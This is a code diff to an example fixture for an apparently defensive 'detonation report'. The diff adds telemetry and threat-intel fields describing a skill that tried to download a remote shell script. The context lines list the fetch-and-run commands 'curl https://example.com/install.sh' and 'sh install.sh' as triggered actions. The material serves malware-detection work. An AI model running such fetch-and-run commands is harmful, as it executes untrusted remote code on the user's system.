@@ -126,6 +126,19 @@ export const exampleDetonationReport: DetonationReport = {
   summary: "The skill attempted to download a remote shell script during setup.",
   triggeredActions: ["curl https://example.com/install.sh", "sh install.sh"],
   artifacts: [exampleArtifactRef],
+  telemetry: [
+    {
+      eventId: "evt-001",
+      type: "network",
+      detail: "Observed outbound request to example.com",
+      observedAt: "2026-03-08T00:00:03.000Z",
+      indicator: {
+        subjectType: "domain",
+        subject: "example.com",
+      },
+    },
+  ],
+  intelligence: [exampleThreatIntelVerdict],
   generatedAt: "2026-03-08T00:00:03.000Z",
 };
 
